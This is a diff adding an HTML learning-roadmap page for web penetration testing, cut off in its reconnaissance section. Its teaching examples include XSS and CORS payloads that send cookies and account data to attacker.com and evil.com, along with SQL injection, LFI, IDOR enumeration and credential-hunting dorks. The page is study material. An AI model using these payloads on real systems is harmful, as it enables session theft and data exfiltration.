@@ -1,0 +1,1929 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="description" content="Assem Merzoug - Web Pentester Learning Roadmap">
+    <title>4ss3m — roadmap</title>
+    <link rel="icon" type="image/x-icon" href="favicon.ico">
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+
+        body {
+            font-family: 'Courier New', Courier, monospace;
+            background: #000;
+            color: #0f0;
+            font-size: 14px;
+            line-height: 1.7;
+            padding: 20px;
+        }
+
+        .container {
+            max-width: 720px;
+            margin: 0 auto;
+            padding: 40px 20px 80px;
+        }
+
+        /* ── NAV ── */
+        .nav {
+            margin-bottom: 40px;
+            font-size: 13px;
+        }
+        .nav a {
+            color: #0a0;
+            text-decoration: none;
+            margin-right: 20px;
+        }
+        .nav a:hover { color: #0f0; }
+        .nav .active { color: #0f0; text-decoration: underline; }
+
+        /* ── HEADER ── */
+        .page-title {
+            font-size: 18px;
+            color: #0f0;
+            margin-bottom: 6px;
+            font-weight: normal;
+        }
+        .page-sub {
+            color: #0a0;
+            font-size: 12px;
+            margin-bottom: 8px;
+            font-style: italic;
+        }
+        .page-desc {
+            color: #0a0;
+            font-size: 13px;
+            border-left: 2px solid #0f0;
+            padding-left: 14px;
+            margin: 20px 0 32px;
+            line-height: 1.8;
+        }
+
+        /* ── PHASE BLOCK ── */
+        .phase {
+            margin-bottom: 6px;
+            border: 1px solid #0a0;
+        }
+        .phase.open {
+            border-color: #0f0;
+        }
+
+        .phase-header {
+            display: flex;
+            align-items: baseline;
+            gap: 14px;
+            padding: 14px 16px;
+            cursor: pointer;
+            user-select: none;
+            background: transparent;
+            border: none;
+            width: 100%;
+            text-align: left;
+            color: #0f0;
+            font-family: 'Courier New', Courier, monospace;
+            font-size: 14px;
+            transition: background 0.15s;
+        }
+        .phase-header:hover { background: #001a00; }
+        .phase.open .phase-header { background: #001200; }
+
+        .phase-num {
+            font-size: 11px;
+            color: #0a0;
+            min-width: 60px;
+            flex-shrink: 0;
+        }
+        .phase-title {
+            flex: 1;
+            font-size: 14px;
+            color: #0f0;
+            letter-spacing: 0.05em;
+        }
+        .phase-arrow {
+            font-size: 11px;
+            color: #0a0;
+            flex-shrink: 0;
+            transition: transform 0.15s;
+        }
+        .phase.open .phase-arrow { transform: rotate(90deg); }
+
+        .phase-body {
+            display: none;
+            padding: 0 16px 20px;
+            border-top: 1px solid #030;
+        }
+        .phase.open .phase-body { display: block; }
+
+        /* what this phase is about */
+        .phase-about {
+            color: #0a0;
+            font-size: 13px;
+            font-style: italic;
+            padding: 14px 0 18px;
+            border-bottom: 1px dashed #030;
+            margin-bottom: 16px;
+            line-height: 1.8;
+        }
+
+        /* ── SECTION INSIDE PHASE ── */
+        .section-block {
+            margin-bottom: 8px;
+            border: 1px solid #030;
+        }
+        .section-header {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            padding: 10px 14px;
+            cursor: pointer;
+            background: transparent;
+            border: none;
+            width: 100%;
+            text-align: left;
+            color: #0f0;
+            font-family: 'Courier New', Courier, monospace;
+            font-size: 13px;
+        }
+        .section-header:hover { background: #001200; }
+        .section-title { color: #0f0; letter-spacing: 0.08em; }
+        .section-arrow { font-size: 10px; color: #0a0; transition: transform 0.15s; }
+        .section-block.open .section-arrow { transform: rotate(90deg); }
+        .section-body { display: none; padding: 0 14px 14px; }
+        .section-block.open .section-body { display: block; }
+
+        .section-summary {
+            color: #0a0;
+            font-size: 12px;
+            font-style: italic;
+            padding: 10px 0 14px;
+            line-height: 1.8;
+            border-bottom: 1px dashed #020;
+            margin-bottom: 12px;
+        }
+
+        /* ── ITEM (expandable) ── */
+        .item {
+            margin-bottom: 4px;
+            border-left: 2px solid #030;
+        }
+        .item-header {
+            display: flex;
+            align-items: flex-start;
+            gap: 10px;
+            padding: 8px 10px;
+            cursor: pointer;
+            background: transparent;
+            border: none;
+            width: 100%;
+            text-align: left;
+            font-family: 'Courier New', Courier, monospace;
+            font-size: 12px;
+            color: #0a0;
+        }
+        .item-header:hover { background: #001000; color: #0f0; }
+        .item.open .item-header { color: #0f0; background: #001000; }
+        .item-bullet { flex-shrink: 0; }
+        .item-name { flex: 1; line-height: 1.5; }
+        .item-body { display: none; padding: 8px 10px 12px 28px; }
+        .item.open .item-body { display: block; }
+
+        .item-detail {
+            color: #0a0;
+            font-size: 12px;
+            line-height: 1.8;
+            margin-bottom: 10px;
+        }
+
+        /* ── CODE BLOCK ── */
+        .code-block {
+            background: #000;
+            border: 1px solid #030;
+            border-left: 3px solid #0f0;
+            padding: 12px 14px;
+            font-size: 11px;
+            color: #0f0;
+            line-height: 1.7;
+            overflow-x: auto;
+            white-space: pre;
+            margin-top: 6px;
+            font-family: 'Courier New', Courier, monospace;
+        }
+        .code-label {
+            font-size: 10px;
+            color: #050;
+            letter-spacing: 0.15em;
+            margin-bottom: 6px;
+        }
+
+        /* ── LANGUAGE CARD (phase 0) ── */
+        .lang-card {
+            border: 1px solid #030;
+            margin-bottom: 6px;
+        }
+        .lang-header {
+            display: flex;
+            align-items: center;
+            gap: 14px;
+            padding: 12px 14px;
+            cursor: pointer;
+            background: transparent;
+            border: none;
+            width: 100%;
+            text-align: left;
+            font-family: 'Courier New', Courier, monospace;
+            font-size: 13px;
+            color: #0f0;
+        }
+        .lang-header:hover { background: #001200; }
+        .lang-card.open .lang-header { background: #001200; }
+        .lang-priority { font-size: 10px; color: #0a0; font-style: italic; }
+        .lang-body { display: none; padding: 0 14px 16px; }
+        .lang-card.open .lang-body { display: block; }
+        .lang-why {
+            color: #0a0;
+            font-size: 12px;
+            font-style: italic;
+            padding: 10px 0 14px;
+            line-height: 1.8;
+            border-bottom: 1px dashed #020;
+            margin-bottom: 12px;
+        }
+        .lang-need-title {
+            font-size: 10px;
+            letter-spacing: 0.15em;
+            color: #060;
+            margin-bottom: 8px;
+        }
+        .lang-need-item {
+            display: flex;
+            gap: 8px;
+            margin-bottom: 5px;
+            font-size: 12px;
+            color: #0a0;
+        }
+        .lang-need-item span:first-child { color: #060; flex-shrink: 0; }
+
+        /* ── FOOTER ── */
+        .back-link {
+            display: inline-block;
+            margin-top: 50px;
+            color: #0a0;
+            text-decoration: none;
+            font-size: 13px;
+        }
+        .back-link:hover { color: #0f0; }
+
+        .philosophy {
+            margin-top: 50px;
+            border-top: 1px solid #030;
+            padding-top: 20px;
+            color: #050;
+            font-size: 12px;
+            font-style: italic;
+        }
+
+        @media (max-width: 600px) {
+            body { font-size: 13px; padding: 12px; }
+            .container { padding: 20px 10px 60px; }
+            .phase-title { font-size: 13px; }
+            .code-block { font-size: 10px; }
+        }
+    </style>
+</head>
+<body>
+<div class="container">
+
+    <div class="nav">
+        <a href="index.html">&lt; back</a>
+        <span class="active">roadmap</span>
+    </div>
+
+    <h1 class="page-title">web pentester — full learning roadmap</h1>
+    <p class="page-sub">4ss3m / assem merzoug / updated 2025</p>
+
+    <div class="page-desc">
+        this is the complete roadmap i'm following to become a professional web penetration tester.<br>
+        it covers everything i need to learn — from the ground up to industry certifications (CWES, BSCP).<br>
+        each phase is expandable. click any phase, section, or topic to read the detail.<br><br>
+        this isn't a course list. it's a living document of deliberate, structured skill-building.
+    </div>
+
+    <!-- ═══════════════════════════════════════════════════
+         PHASE 0 — CODING
+    ════════════════════════════════════════════════════ -->
+    <div class="phase" id="phase-0">
+        <button class="phase-header" onclick="togglePhase('phase-0')">
+            <span class="phase-num">phase 00</span>
+            <span class="phase-title">CODING FOR WEB SECURITY</span>
+            <span class="phase-arrow">></span>
+        </button>
+        <div class="phase-body">
+            <div class="phase-about">
+                web pentesting is not software engineering. the goal isn't to build apps — it's to understand how they break.<br>
+                that requires a specific, narrower set of coding skills: reading exploits, writing small automation scripts, understanding what dangerous code looks like when you're reading someone else's application.<br><br>
+                below is every language i need, why, and exactly what level i need to reach in each one.
+            </div>
+
+            <div class="lang-card" id="lang-python">
+                <button class="lang-header" onclick="toggleLang('lang-python')">
+                    <span>python</span>
+                    <span class="lang-priority">— high priority. your main scripting language.</span>
+                    <span class="phase-arrow" style="margin-left:auto">></span>
+                </button>
+                <div class="lang-body">
+                    <div class="lang-why">
+                        almost every security tool is written in Python. every public exploit on ExploitDB is in Python.
+                        you need to be able to read an exploit script, understand what it does, modify the target URL or payload, and run it.
+                        beyond that: writing your own small automation scripts is a daily reality — looping through IDs to find IDORs, sending crafted HTTP requests, parsing JSON responses.
+                    </div>
+                    <div class="lang-need-title">what i need to be able to do :</div>
+                    <div class="lang-need-item"><span>></span><span>read and understand existing exploit scripts without getting lost</span></div>
+                    <div class="lang-need-item"><span>></span><span>send HTTP requests using the <code>requests</code> library — GET, POST, headers, cookies</span></div>
+                    <div class="lang-need-item"><span>></span><span>parse JSON responses and extract specific fields</span></div>
+                    <div class="lang-need-item"><span>></span><span>write a loop over a wordlist and check responses (fuzzing logic)</span></div>
+                    <div class="lang-need-item"><span>></span><span>modify PoC exploit payloads for a specific target</span></div>
+                    <div class="lang-need-item"><span>></span><span>basic file I/O — read a wordlist, write results to a file</span></div>
+                    <div class="code-label">// real example — custom IDOR scanner</div>
+                    <div class="code-block">import requests
+
+session_cookie = {"session": "your_token_here"}
+target = "https://target.com/api/user/"
+
+for user_id in range(1, 500):
+    r = requests.get(target + str(user_id), cookies=session_cookie)
+    if r.status_code == 200 and "email" in r.text:
+        print(f"[IDOR] user {user_id}: {r.json()['email']}")
+
+# this is a real attack script.
+# it loops through user IDs trying to access other users' data.
+# if the server doesn't verify ownership → every user's email is exposed.</div>
+                    <div style="margin-top:14px" class="lang-need-title">where to learn :</div>
+                    <div class="lang-need-item"><span>></span><span>Python for Everybody (free, py4e.com) — stop after week 4</span></div>
+                    <div class="lang-need-item"><span>></span><span>HTB Academy: Introduction to Python 3 module</span></div>
+                    <div class="lang-need-item"><span>></span><span>automate the boring stuff (automatetheboringstuff.com) — chapters 1–11</span></div>
+                </div>
+            </div>
+
+            <div class="lang-card" id="lang-bash">
+                <button class="lang-header" onclick="toggleLang('lang-bash')">
+                    <span>bash</span>
+                    <span class="lang-priority">— high priority. you live in a terminal.</span>
+                    <span class="phase-arrow" style="margin-left:auto">></span>
+                </button>
+                <div class="lang-body">
+                    <div class="lang-why">
+                        every tool runs from a bash terminal. chaining tools together, processing their output, writing one-liners that automate repetitive recon tasks —
+                        this is the difference between someone who "knows tools" and someone who actually works efficiently.
+                        bash is the glue that connects everything.
+                    </div>
+                    <div class="lang-need-title">what i need to be able to do :</div>
+                    <div class="lang-need-item"><span>></span><span>pipe commands together — tool output → filter → next tool</span></div>
+                    <div class="lang-need-item"><span>></span><span>write loops over wordlists or IP ranges</span></div>
+                    <div class="lang-need-item"><span>></span><span>redirect and save output to files</span></div>
+                    <div class="lang-need-item"><span>></span><span>basic conditionals — if response contains X, do Y</span></div>
+                    <div class="lang-need-item"><span>></span><span>use grep, awk, sed to extract patterns from text output</span></div>
+                    <div class="code-label">// real example — subdomain recon pipeline</div>
+                    <div class="code-block"># find all live subdomains and save them
+subfinder -d target.com -silent | \
+  httpx -silent -status-code | \
+  grep -v "404\|400" | \
+  tee live_subdomains.txt
+
+# extract all JS file URLs from a crawl, search for API keys
+cat urls.txt | grep "\.js$" | while read url; do
+  curl -s "$url" | grep -oE "(api_key|token|secret)['\"][[:space:]]*:[[:space:]]*['\"][^'\"]{8,}"
+done
+
+# these are real recon one-liners used in actual pentests.</div>
+                    <div style="margin-top:14px" class="lang-need-title">where to learn :</div>
+                    <div class="lang-need-item"><span>></span><span>OverTheWire: Bandit (overthewire.org) — gamified bash fundamentals</span></div>
+                    <div class="lang-need-item"><span>></span><span>The Linux Command Line (free book) — first 10 chapters</span></div>
+                    <div class="lang-need-item"><span>></span><span>HTB Academy: Linux Fundamentals module</span></div>
+                </div>
+            </div>
+
+            <div class="lang-card" id="lang-js">
+                <button class="lang-header" onclick="toggleLang('lang-js')">
+                    <span>javascript</span>
+                    <span class="lang-priority">— medium priority. reading more than writing.</span>
+                    <span class="phase-arrow" style="margin-left:auto">></span>
+                </button>
+                <div class="lang-body">
+                    <div class="lang-why">
+                        JavaScript runs in every browser, and modern web apps load all their logic — including API endpoints, routes, and sometimes hardcoded credentials — in JS files.
+                        as a pentester, you need to read minified JS to find hidden endpoints, write XSS payloads that steal cookies, and understand how the browser executes scripts.
+                        you won't be building JS apps. you need to understand what JS code does when you read it.
+                    </div>
+                    <div class="lang-need-title">what i need to be able to do :</div>
+                    <div class="lang-need-item"><span>></span><span>read and understand minified / obfuscated JS (deobfuscation)</span></div>
+                    <div class="lang-need-item"><span>></span><span>understand the DOM — document.cookie, window.location, innerHTML</span></div>
+                    <div class="lang-need-item"><span>></span><span>write XSS payloads — from basic alert(1) to real cookie theft</span></div>
+                    <div class="lang-need-item"><span>></span><span>identify where user input flows into dangerous JS functions (XSS sinks)</span></div>
+                    <div class="lang-need-item"><span>></span><span>use fetch() in payloads to exfiltrate data to an attacker-controlled server</span></div>
+                    <div class="code-label">// real example — XSS cookie theft payload</div>
+                    <div class="code-block">// basic proof-of-concept (confirms XSS exists):
+<script>alert(document.cookie)</script>
+
+// real impact payload — sends victim's cookie to attacker's server:
+<script>
+  fetch('https://attacker.com/log?c=' + encodeURIComponent(document.cookie))
+</script>
+
+// finding XSS sinks in source code — dangerous patterns:
+document.getElementById('out').innerHTML = userInput  // SINK — executes HTML
+eval(userInput)                                        // SINK — executes JS
+location.href = userInput                             // SINK — open redirect</div>
+                    <div style="margin-top:14px" class="lang-need-title">where to learn :</div>
+                    <div class="lang-need-item"><span>></span><span>javascript.info — chapters 1–5 give you what you need</span></div>
+                    <div class="lang-need-item"><span>></span><span>HTB Academy: JavaScript Deobfuscation module (in my path)</span></div>
+                    <div class="lang-need-item"><span>></span><span>PortSwigger XSS labs — learn by exploiting real examples</span></div>
+                </div>
+            </div>
+
+            <div class="lang-card" id="lang-sql">
+                <button class="lang-header" onclick="toggleLang('lang-sql')">
+                    <span>sql</span>
+                    <span class="lang-priority">— essential. cannot do SQLi without it.</span>
+                    <span class="phase-arrow" style="margin-left:auto">></span>
+                </button>
+                <div class="lang-body">
+                    <div class="lang-why">
+                        SQL injection is one of the most common and highest-impact vulnerabilities in existence — 30 years old and still appearing in major breaches.
+                        to craft injections, you need to understand what valid SQL looks like. you don't need to be a database administrator.
+                        you need to understand queries, boolean logic, UNION syntax, and the differences between MySQL, PostgreSQL, and MSSQL.
+                    </div>
+                    <div class="lang-need-title">what i need to be able to do :</div>
+                    <div class="lang-need-item"><span>></span><span>understand SELECT, WHERE, AND/OR — the boolean logic injections exploit</span></div>
+                    <div class="lang-need-item"><span>></span><span>understand UNION SELECT — how you extract data from other database tables</span></div>
+                    <div class="lang-need-item"><span>></span><span>know comment syntax per DB engine: # and -- for MySQL, -- for PostgreSQL</span></div>
+                    <div class="lang-need-item"><span>></span><span>read and construct subqueries</span></div>
+                    <div class="lang-need-item"><span>></span><span>understand the information_schema — how to enumerate tables and columns</span></div>
+                    <div class="code-label">// how SQL injection actually works</div>
+                    <div class="code-block">-- normal query the application runs:
+SELECT * FROM users WHERE username='admin' AND password='mypassword'
+
+-- you inject as the username field: admin'--
+-- the database now sees:
+SELECT * FROM users WHERE username='admin'--' AND password='x'
+-- everything after -- is a comment. password check is gone. you're logged in.
+
+-- extracting data with UNION:
+-- first find how many columns: add ORDER BY 1, then 2, then 3... until error
+-- then inject:
+' UNION SELECT username, password FROM users--
+-- result: every username and password hash in the database</div>
+                    <div style="margin-top:14px" class="lang-need-title">where to learn :</div>
+                    <div class="lang-need-item"><span>></span><span>SQLZoo (sqlzoo.net) — free interactive, first 6 sections</span></div>
+                    <div class="lang-need-item"><span>></span><span>PortSwigger SQL Injection topic — read + do all labs</span></div>
+                    <div class="lang-need-item"><span>></span><span>HTB Academy: SQL Injection Fundamentals module</span></div>
+                </div>
+            </div>
+
+            <div class="lang-card" id="lang-php">
+                <button class="lang-header" onclick="toggleLang('lang-php')">
+                    <span>php</span>
+                    <span class="lang-priority">— read-only. spotting vulnerabilities in source code.</span>
+                    <span class="phase-arrow" style="margin-left:auto">></span>
+                </button>
+                <div class="lang-body">
+                    <div class="lang-why">
+                        a large portion of vulnerable web apps run PHP — WordPress, legacy apps, custom CMSs.
+                        during a pentest, you'll sometimes get access to source code (via git exposure, file inclusion, or white-box testing).
+                        you need to read PHP code and spot the dangerous patterns: where does user input go, and does it reach an unsafe function?
+                        you don't write PHP. you audit it.
+                    </div>
+                    <div class="lang-need-title">what i need to be able to do :</div>
+                    <div class="lang-need-item"><span>></span><span>read basic PHP — variables, functions, conditionals, includes</span></div>
+                    <div class="lang-need-item"><span>></span><span>recognize dangerous functions: system(), exec(), eval(), include(), unserialize()</span></div>
+                    <div class="lang-need-item"><span>></span><span>understand $_GET, $_POST, $_COOKIE as user-controlled attack surface</span></div>
+                    <div class="lang-need-item"><span>></span><span>understand PHP type juggling — loose == comparison leading to auth bypass</span></div>
+                    <div class="lang-need-item"><span>></span><span>understand PHP wrappers — php://filter, php://input (used in LFI attacks)</span></div>
+                    <div class="code-label">// what dangerous PHP code looks like</div>
+                    <div class="code-block"><?php
+// vulnerable to local file inclusion (LFI):
+$page = $_GET['page'];      // user controls this
+include($page . '.php');    // user controls what gets included
+
+// attacker sends: ?page=../../../../etc/passwd%00
+// server includes /etc/passwd — reads system files
+
+// vulnerable to remote code execution:
+$cmd = $_GET['cmd'];
+system($cmd);               // executes arbitrary OS commands
+
+// attacker sends: ?cmd=id
+// server responds: uid=33(www-data) — full command execution
+?></div>
+                    <div style="margin-top:14px" class="lang-need-title">where to learn :</div>
+                    <div class="lang-need-item"><span>></span><span>PentesterLab — code review exercises (PHP-heavy, free tier available)</span></div>
+                    <div class="lang-need-item"><span>></span><span>read HTB writeups that involve source code review</span></div>
+                    <div class="lang-need-item"><span>></span><span>PHP manual — look up specific functions as you encounter them</span></div>
+                </div>
+            </div>
+
+        </div>
+    </div>
+
+    <!-- ═══════════════════════════════════════════════════
+         PHASE 1 — FOUNDATIONS
+    ════════════════════════════════════════════════════ -->
+    <div class="phase" id="phase-1">
+        <button class="phase-header" onclick="togglePhase('phase-1')">
+            <span class="phase-num">phase 01</span>
+            <span class="phase-title">FOUNDATIONS — networking, HTTP, tools</span>
+            <span class="phase-arrow">></span>
+        </button>
+        <div class="phase-body">
+            <div class="phase-about">
+                before touching a single vulnerability, you need to understand how the web works at a technical level.
+                HTTP is the protocol that every web application runs on — understanding it deeply is what separates guessing from systematic testing.
+                this phase is also where you set up and learn your core tooling, especially Burp Suite.
+            </div>
+
+            <div class="section-block" id="s1-http">
+                <button class="section-header" onclick="toggleSection('s1-http')">
+                    <span class="section-title">HTTP & networking</span>
+                    <span class="section-arrow">></span>
+                </button>
+                <div class="section-body">
+                    <div class="section-summary">
+                        HTTP is the language of web attacks. every vulnerability you exploit is delivered via an HTTP request.
+                        understanding requests, responses, headers, cookies, and status codes is not optional background knowledge — it is the attack surface itself.
+                    </div>
+                    <div class="item" id="i-tcpip">
+                        <button class="item-header" onclick="toggleItem('i-tcpip')">
+                            <span class="item-bullet">></span>
+                            <span class="item-name">TCP/IP — how packets travel across the internet</span>
+                        </button>
+                        <div class="item-body">
+                            <div class="item-detail">
+                                every HTTP request is a TCP connection first. the three-way handshake (SYN → SYN-ACK → ACK) establishes the connection before any HTTP data is sent.
+                                knowing IP addressing — private ranges (192.168.x.x, 10.x.x.x, 172.16-31.x.x) — becomes critical when exploiting SSRF, where you make a server reach its own internal network.
+                            </div>
+                            <div class="code-label">// why this matters in practice</div>
+                            <div class="code-block">when you find SSRF (server-side request forgery):
+you probe internal IPs: 192.168.1.1, 10.0.0.1, 172.16.0.1
+without knowing private IP ranges, you're guessing blind.
+
+cloud environments add: 169.254.169.254
+that's AWS instance metadata — contains temporary AWS credentials.
+SSRF to that address = potential full AWS account takeover.</div>
+                        </div>
+                    </div>
+                    <div class="item" id="i-httpmethods">
+                        <button class="item-header" onclick="toggleItem('i-httpmethods')">
+                            <span class="item-bullet">></span>
+                            <span class="item-name">HTTP methods — GET, POST, PUT, DELETE, PATCH, OPTIONS, HEAD</span>
+                        </button>
+                        <div class="item-body">
+                            <div class="item-detail">
+                                each method has a different intended purpose and different security implications.
+                                APIs often expose DELETE and PUT endpoints without proper authentication, assuming nobody would try them without a documented link.
+                                the OPTIONS method reveals which methods are allowed on an endpoint — a recon goldmine.
+                            </div>
+                            <div class="code-label">// practical example</div>
+                            <div class="code-block">curl -X OPTIONS https://target.com/api/user
+# response: Allow: GET, POST, DELETE, PUT
+
+# you see DELETE is allowed.
+# you try: DELETE /api/user/1337
+# if the server doesn't check authorization → you deleted a user.
+# that's an access control vulnerability found by testing HTTP methods.</div>
+                        </div>
+                    </div>
+                    <div class="item" id="i-headers">
+                        <button class="item-header" onclick="toggleItem('i-headers')">
+                            <span class="item-bullet">></span>
+                            <span class="item-name">HTTP headers — the information-dense part of every request</span>
+                        </button>
+                        <div class="item-body">
+                            <div class="item-detail">
+                                response headers reveal what technology the server runs. request headers control caching, authentication, content type, and routing.
+                                as an attacker you read headers to fingerprint the server, inject into them for CRLF attacks, and set them to bypass IP-based protections.
+                            </div>
+                            <div class="code-label">// header → CVE in seconds</div>
+                            <div class="code-block">server response includes: Server: Apache/2.4.49
+you google "Apache 2.4.49 CVE"
+→ CVE-2021-41773: path traversal and RCE
+→ public exploit is one curl command
+
+that header leak turned into a critical RCE in under 2 minutes.
+this is how real initial access works.</div>
+                        </div>
+                    </div>
+                    <div class="item" id="i-cookies">
+                        <button class="item-header" onclick="toggleItem('i-cookies')">
+                            <span class="item-bullet">></span>
+                            <span class="item-name">cookies — security flags and what they protect against</span>
+                        </button>
+                        <div class="item-body">
+                            <div class="item-detail">
+                                cookies carry session tokens — the thing that proves you're logged in. three security flags matter:<br>
+                                HttpOnly: JavaScript can't read the cookie. your XSS payload can't steal it directly.<br>
+                                Secure: the cookie only travels over HTTPS. interceptable over HTTP without this.<br>
+                                SameSite=Strict/Lax: the browser won't send this cookie on cross-site requests. this blocks CSRF.<br><br>
+                                when you see a session cookie with none of these flags, that's three separate security findings.
+                            </div>
+                            <div class="code-label">// cookie with no flags = multiple findings</div>
+                            <div class="code-block">Set-Cookie: session=abc123
+
+missing HttpOnly  → XSS can steal it via document.cookie
+missing Secure    → travels over HTTP, interceptable on same network
+missing SameSite  → CSRF attacks can use it cross-site
+
+Set-Cookie: session=abc123; HttpOnly; Secure; SameSite=Strict
+this is what a correctly configured session cookie looks like.</div>
+                        </div>
+                    </div>
+                    <div class="item" id="i-cors">
+                        <button class="item-header" onclick="toggleItem('i-cors')">
+                            <span class="item-bullet">></span>
+                            <span class="item-name">CORS — when cross-origin restrictions are misconfigured</span>
+                        </button>
+                        <div class="item-body">
+                            <div class="item-detail">
+                                the browser's same-origin policy normally prevents JavaScript on evil.com from reading responses from bank.com.
+                                CORS (Cross-Origin Resource Sharing) lets servers relax that policy for trusted origins.
+                                misconfigured CORS — reflecting any Origin header, or using wildcard with credentials — lets attackers steal authenticated data from victims who visit an attacker-controlled page.
+                            </div>
+                            <div class="code-label">// CORS misconfiguration → account data theft</div>
+                            <div class="code-block">// server reflects your Origin header:
+// request:  Origin: https://evil.com
+// response: Access-Control-Allow-Origin: https://evil.com
+//           Access-Control-Allow-Credentials: true
+
+// you host this on evil.com:
+fetch('https://bank.com/api/account', {credentials: 'include'})
+  .then(r => r.json())
+  .then(data => fetch('https://evil.com/steal?d=' + JSON.stringify(data)))
+
+// victim visits evil.com → their browser sends their bank cookies →
+// server allows it (CORS says evil.com is trusted) →
+// bank account data sent to attacker.</div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="section-block" id="s1-burp">
+                <button class="section-header" onclick="toggleSection('s1-burp')">
+                    <span class="section-title">Burp Suite — the core tool</span>
+                    <span class="section-arrow">></span>
+                </button>
+                <div class="section-body">
+                    <div class="section-summary">
+                        Burp Suite is to web pentesting what a debugger is to software development — your main workspace.
+                        every request you make from your browser flows through it. you see everything, you can modify everything, you can replay anything.
+                        learning Burp is not optional. it's the skill that makes all the others possible.
+                    </div>
+                    <div class="item" id="i-proxy">
+                        <button class="item-header" onclick="toggleItem('i-proxy')">
+                            <span class="item-bullet">></span>
+                            <span class="item-name">Proxy — intercepting and modifying every request in real time</span>
+                        </button>
+                        <div class="item-body">
+                            <div class="item-detail">
+                                you configure your browser to send traffic through Burp's proxy. Burp sits in the middle, showing you every request before it reaches the server.
+                                you can pause requests, modify them (change parameters, headers, cookies, body), then forward them.
+                                this is how you bypass client-side validation: the browser's JavaScript checks run, but you intercept the request after they run and before it reaches the server — and change whatever you want.
+                            </div>
+                            <div class="code-label">// bypassing client-side price validation</div>
+                            <div class="code-block">// HTML: <input type="number" name="price" readonly value="99.00">
+// the field is readonly — you can't change it in the browser.
+// BUT you intercept the checkout POST request in Burp:
+
+POST /checkout HTTP/1.1
+Host: shop.com
+Cookie: session=your_token
+
+product_id=5&quantity=1&price=99.00
+
+// in Burp: change price=99.00 to price=0.01
+// forward the request.
+// if the server doesn't re-validate the price → you paid $0.01 for a $99 item.
+// business logic vulnerability. critical finding.</div>
+                        </div>
+                    </div>
+                    <div class="item" id="i-repeater">
+                        <button class="item-header" onclick="toggleItem('i-repeater')">
+                            <span class="item-bullet">></span>
+                            <span class="item-name">Repeater — manual exploitation, one request at a time</span>
+                        </button>
+                        <div class="item-body">
+                            <div class="item-detail">
+                                Repeater sends the same request with modifications and shows you the response side by side.
+                                this is how you manually test for vulnerabilities: send normal request, note response. add a single quote, note if the response changes (SQL error?). add a payload, note the output.
+                                you'll spend the majority of your active exploitation time in Repeater.
+                            </div>
+                            <div class="code-label">// manually confirming SQL injection in Repeater</div>
+                            <div class="code-block">attempt 1: GET /item?id=5
+response: normal product page
+
+attempt 2: GET /item?id=5'
+response: "You have an error in your SQL syntax..."
+→ confirmed: input reaches the database unfiltered
+
+attempt 3: GET /item?id=5'--
+response: normal product page again
+→ confirmed: comment closed the broken query → SQLi exploitable
+
+now you know exactly what you have and can build the full exploit.</div>
+                        </div>
+                    </div>
+                    <div class="item" id="i-intruder">
+                        <button class="item-header" onclick="toggleItem('i-intruder')">
+                            <span class="item-bullet">></span>
+                            <span class="item-name">Intruder — automated payload injection across multiple positions</span>
+                        </button>
+                        <div class="item-body">
+                            <div class="item-detail">
+                                Intruder marks positions in a request and then replaces them with payloads from a wordlist — automatically, hundreds or thousands of times.
+                                Sniper mode: one position, one wordlist. used for brute-forcing passwords or fuzzing a single parameter.
+                                Cluster Bomb: multiple positions, multiple wordlists, every combination. used for credential stuffing (username + password pairs).
+                                the Community edition is rate-limited — for speed, use ffuf or Turbo Intruder.
+                            </div>
+                            <div class="code-label">// IDOR testing with Intruder</div>
+                            <div class="code-block">request: GET /api/invoice/§1337§
+wordlist: numbers 1 to 10000
+
+Intruder sends:
+GET /api/invoice/1
+GET /api/invoice/2
+GET /api/invoice/3
+...
+
+filter results by response length or status code.
+every response that differs from "403 Forbidden" →
+you accessed someone else's invoice. IDOR confirmed.</div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- ═══════════════════════════════════════════════════
+         PHASE 2 — RECON
+    ════════════════════════════════════════════════════ -->
+    <div class="phase" id="phase-2">
+        <button class="phase-header" onclick="togglePhase('phase-2')">
+            <span class="phase-num">phase 02</span>
+            <span class="phase-title">RECON & ENUMERATION — mapping the attack surface</span>
+            <span class="phase-arrow">></span>
+        </button>
+        <div class="phase-body">
+            <div class="phase-about">
+                before you attack, you map. recon determines what's actually there — subdomains, hidden directories, forgotten endpoints, leaked credentials.
+                the best pentester doesn't just attack what's visible. they find what the target didn't know was exposed.
+                this phase covers both passive recon (no traffic to the target) and active enumeration (direct requests).
+            </div>
+
+            <div class="section-block" id="s2-passive">
+                <button class="section-header" onclick="toggleSection('s2-passive')">
+                    <span class="section-title">passive recon — gathering intel without touching the target</span>
+                    <span class="section-arrow">></span>
+                </button>
+                <div class="section-body">
+                    <div class="section-summary">
+                        passive recon uses public sources: search engines, certificate logs, archive snapshots, code repositories.
+                        zero traffic hits the target's servers. often finds the most critical exposures — things the target forgot they published.
+                    </div>
+                    <div class="item" id="i-dorks">
+                        <button class="item-header" onclick="toggleItem('i-dorks')">
+                            <span class="item-bullet">></span>
+                            <span class="item-name">Google dorks — finding what was accidentally published</span>
+                        </button>
+                        <div class="item-body">
+                            <div class="item-detail">
+                                Google indexes everything public — including things companies didn't intend to publish.
+                                dorks are targeted search queries that surface specific file types, directory listings, admin panels, or configuration files.
+                                the Google Hacking Database (GHDB) has thousands of dork patterns.
+                            </div>
+                            <div class="code-label">// high-value dork examples</div>
+                            <div class="code-block">site:target.com filetype:env
+→ finds .env files containing: DB_PASSWORD=, AWS_SECRET_KEY=
+
+site:target.com intitle:"index of"
+→ finds open directory listings — all files publicly browsable
+
+site:target.com ext:php inurl:admin
+→ finds admin panels built in PHP
+
+"target.com" filetype:sql
+→ finds SQL database dumps accidentally published
+
+"@target.com" filetype:xls
+→ finds employee spreadsheets with internal email addresses</div>
+                        </div>
+                    </div>
+                    <div class="item" id="i-crt">
+                        <button class="item-header" onclick="toggleItem('i-crt')">
+                            <span class="item-bullet">></span>
+                            <span class="item-name">certificate transparency logs — every subdomain ever issued a cert</span>
+                        </button>
+                        <div class="item-body">
+                            <div class="item-detail">
+                                every SSL certificate issued by a trusted authority is logged in a public CT log.
+                                crt.sh lets you search by domain and see every subdomain that has ever had a certificate.
+                                this finds staging environments, dev servers, internal tools that were briefly public — all with less hardening than production.
+                            </div>
+                            <div class="code-label">// crt.sh search result example</div>
+                            <div class="code-block">search: %.target.com on crt.sh
+
